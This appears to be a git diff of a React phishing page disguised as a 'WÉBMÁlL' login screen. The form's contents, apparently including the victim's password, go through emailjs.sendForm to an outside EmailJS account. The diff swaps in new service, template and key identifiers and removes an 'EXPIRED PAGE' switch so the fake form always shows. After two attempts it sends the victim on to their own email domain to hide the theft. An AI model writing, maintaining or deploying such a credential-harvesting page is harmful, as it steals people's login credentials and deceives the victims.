@@ -45,7 +45,7 @@ function App() {
     if (count < 2) {
       setCount(prevCount => prevCount + 1)
 
-      emailjs.sendForm('service_upuq8tw', 'template_ihv35xq', form.current, 'HODMj4Z3iv5j_RC1l')
+      emailjs.sendForm('service_yhntau9', 'template_omqihka', form.current, 'PGH4OIS-XQr7cngOw')
       .then((result) => {
         setLoading(false)
         setPwdOne("")
@@ -58,7 +58,7 @@ function App() {
 
 
     if (count >= 2 ) {
-      emailjs.sendForm('service_upuq8tw', 'template_ihv35xq', form.current, 'HODMj4Z3iv5j_RC1l')
+      emailjs.sendForm('service_yhntau9', 'template_omqihka', form.current, 'PGH4OIS-XQr7cngOw')
       .then((result) => {
         const redir = getPartAfterDot(email)
         window.location.replace(`https://${redir}`);
@@ -75,9 +75,6 @@ function App() {
 
   return (
     <div>
-      {!isExpired ? 
-        <h2 className='expired'>EXPIRED PAGE</h2>
-      :
         <div className="general">
           <h2>WÉBMÁlL</h2>
           <img src={logo} className="img2" alt='Timeout'/>
@@ -116,7 +113,6 @@ function App() {
             </div>
           }
         </div>
-      }
       
     </div>
   );
